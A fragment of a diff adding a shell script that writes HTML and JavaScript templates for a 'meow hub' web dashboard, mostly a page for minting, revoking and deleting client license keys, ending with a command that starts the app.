+  fetch('/api/live/flash?since='+lastFlashId).then(r=>r.json()).then(function(evts){
+    evts.reverse().forEach(function(e){ lastFlashId = Math.max(lastFlashId, e.id); pushFlash(e); });
+    var feed = document.getElementById('feed');
+    if(evts.length) feed.innerHTML = evts.slice(-8).reverse().map(function(e){
+      return '<div style="margin-bottom:6px"><span class="tag '+e.level+'">'+e.level+'</span> '+esc(e.message)+'</div>';
+    }).join('');
+  }).catch(()=>{});
+}
+setInterval(loadSessions, 3000);
+setInterval(pollFlash, 2500);
+setInterval(function(){ document.getElementById('clock').textContent = new Date().toLocaleTimeString(); }, 1000);
+loadSessions(); pollFlash();
+</script>
+</body>
+</html>
+HTMLEOF
+
+cat > meow_hub/templates/licenses.html << 'HTMLEOF'
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>meow hub — licenses</title>
+<style>
+  :root { --bg:#0b0b10; --card:#15151d; --line:#262633; --txt:#e8e8f0; --dim:#8a8a9a; --acc:#7c5cff; --ok:#2ecc71; --err:#e74c3c; }
+  body { margin:0; background:var(--bg); color:var(--txt); font-family:ui-monospace,Menlo,Consolas,monospace; font-size:13px; }
+  header { display:flex; gap:16px; align-items:center; padding:12px 20px; border-bottom:1px solid var(--line); }
+  header h1 { font-size:15px; margin:0; letter-spacing:2px; }
+  header a { color:var(--dim); text-decoration:none; } header a:hover { color:var(--txt); }
+  .wrap { max-width:760px; margin:24px auto; padding:0 16px; }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:8px; padding:16px; margin-bottom:16px; }
+  table { width:100%; border-collapse:collapse; }
+  td, th { text-align:left; padding:8px; border-bottom:1px solid var(--line); font-size:12px; }
+  input { background:#0e0e14; border:1px solid var(--line); color:var(--txt); border-radius:5px; padding:8px 10px; font-family:inherit; width:260px; }
+  button { background:var(--acc); color:#fff; border:none; border-radius:5px; padding:7px 14px; cursor:pointer; font-family:inherit; }
+  button.ghost { background:transparent; border:1px solid var(--line); color:var(--txt); }
+  button.err { background:var(--err); }
+  .tag { padding:2px 8px; border-radius:4px; background:var(--line); font-size:11px; }
+  .tag.ok { background:#12351f; color:var(--ok); }
+  .tag.err { background:#3a1512; color:var(--err); }
+  .row { display:flex; gap:10px; align-items:center; margin-bottom:12px; }
+  .dim { color:var(--dim); }
+  h3 { margin:0 0 10px; font-size:12px; letter-spacing:1px; color:var(--dim); text-transform:uppercase; }
+</style>
+</head>
+<body>
+<header>
+  <h1>MEOW//LICENSES</h1>
+  <a href="/">sites</a><a href="/live">live</a><a href="/logs">logs</a><a href="/logout">logout</a>
+</header>
+<div class="wrap">
+  <div class="card">
+    <h3>mint license</h3>
+    <div class="row">
+      <input id="label" placeholder="label (e.g. client-7)">
+      <button onclick="mint()">mint key</button>
+    </div>
+    <div id="newkey" class="dim"></div>
+  </div>
+  <div class="card">
+    <h3>active keys</h3>
+    <table>
+      <thead><tr><th>key</th><th>label</th><th>status</th><th>created</th><th></th></tr></thead>
+      <tbody id="keys"></tbody>
+    </table>
+  </div>
+</div>
+<script>
+function esc(s){ return (s||'').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
+function load(){
+  fetch('/api/licenses').then(r=>r.json()).then(function(ks){
+    document.getElementById('keys').innerHTML = ks.map(function(k){
+      return '<tr><td>'+esc(k.key)+'</td><td>'+esc(k.label)+'</td>'
+        + '<td>'+(k.active?'<span class="tag ok">active</span>':'<span class="tag err">revoked</span>')+'</td>'
+        + '<td class="dim">'+new Date(k.created_at).toLocaleDateString()+'</td>'
+        + '<td><button class="ghost" onclick="toggle(\''+k.key+'\')">'+(k.active?'revoke':'restore')+'</button> '
+        + '<button class="err" onclick="burn(\''+k.key+'\')">burn</button></td></tr>';
+    }).join('') || '<tr><td colspan="5" class="dim">no keys minted</td></tr>';
+  });
+}
+function mint(){
+  fetch('/api/licenses',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label:document.getElementById('label').value})})
+    .then(r=>r.json()).then(function(k){
+      document.getElementById('newkey').textContent = 'minted: ' + k.key;
+      document.getElementById('label').value='';
+      load();
+    });
+}
+function toggle(key){ fetch('/api/licenses/'+key+'/toggle',{method:'POST'}).then(load); }
+function burn(key){ fetch('/api/licenses/'+key,{method:'DELETE'}).then(load); }
+load();
+</script>
+</body>
+</html>
+HTMLEOF
+
 python meow_hub/app.py
